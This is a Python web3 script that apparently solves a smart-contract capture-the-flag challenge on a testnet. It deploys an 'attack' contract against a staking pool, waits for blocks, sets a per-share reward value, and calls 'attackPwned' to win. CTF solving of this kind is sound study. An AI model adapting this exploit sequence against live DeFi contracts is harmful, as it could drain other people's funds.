# -*-coding:utf-8-*-
__author__ = 'joker'

import json
import time
from web3 import Web3, HTTPProvider
from web3.gas_strategies.time_based import fast_gas_price_strategy, slow_gas_price_strategy, medium_gas_price_strategy

infura_url = 'https://ropsten.infura.io/v3/xxxx'
# infura_url = 'http://127.0.0.1:7545'
web3 = Web3(Web3.HTTPProvider(infura_url, request_kwargs={'timeout': 600}))


web3.eth.setGasPriceStrategy(fast_gas_price_strategy)
gasprice = web3.eth.generateGasPrice()
print("[+] fast gas price {0}...".format(gasprice))

player_private_key = ''
player_account = web3.eth.account.privateKeyToAccount(player_private_key)
web3.eth.defaultAccount = player_account.address
print("[+] account {0}...".format(player_account.address))


def send_transaction_sync(tx, account, args={}):
    args['nonce'] = web3.eth.getTransactionCount(account.address)
    signed_txn = account.signTransaction(tx.buildTransaction(args))
    tx_hash = web3.eth.sendRawTransaction(signed_txn.rawTransaction)
    time.sleep(30)
    return web3.eth.waitForTransactionReceipt(tx_hash)


print("[+] step0 deployed attack contract...")
with open('./attack.abi', 'r') as f:
    abi = json.load(f)
with open('./attack.bin', 'r') as f:
    code = json.load(f)['object']
attack_contract = web3.eth.contract(bytecode=code, abi=abi)
challenge_address = ""
token_address = ""
tx = attack_contract.constructor(_target=challenge_address,
                                 _token=token_address)
attack_contract_address = send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})[
    'contractAddress']
print("[+] attack contract address {0}...".format(attack_contract_address))
attack_contract = web3.eth.contract(address=attack_contract_address, abi=abi)

# step1 attackPrepare
print("[+] step1 attackPwnedPrepare...")
tx = attack_contract.functions.attackPwnedPrepare()
send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
#

block_number = web3.eth.blockNumber
print("[+] block number {0}...".format(block_number))
print("[+] waiting for reach block number...")
while web3.eth.blockNumber != block_number + 4:
    # print("[-] waiting ...")
    continue

# step2 attackUpdatePool
print("[+] step2 attackUpdatePool...")
tx = attack_contract.functions.attackUpdatePool()
send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
#

input("any key to continue...")
# sometimes u can not get accurate block number of 4 maybe more
# to adapt to we need calc and tranfser
# uint256 leftBalanceChallenge = khinkal.balanceOf(address(target));
# uint256 withdrawBalance = 500004127749479808 * accKhinkalPerShare / 1e12;
# if (leftBalanceChallenge < 2 * withdrawBalance)
#    khinkal.transfer(address(target),2 * withdrawBalance - leftBalanceChallenge);
# set accKhinkalPerShare to attack contract for calcing
print("[+] get accKhinkalPerShare and set it to attack contract...")
with open('./challenge.abi', 'r') as f:
    abi = json.load(f)
challenge_contract = web3.eth.contract(address=challenge_address, abi=abi)
accKhinkalPerShare = challenge_contract.functions.poolInfo(1).call()[3]
tx = attack_contract.functions.setAccKhinkalPerShare(_accKhinkalPerShare=accKhinkalPerShare)
send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
#

# step3 attackPwned
print("[+] step3 attackPwned...")
tx = attack_contract.functions.attackPwned()
send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
#

# check
print('[+] Solved {0} ...'.format(attack_contract.functions.validateInstanceAddress().call()))
#
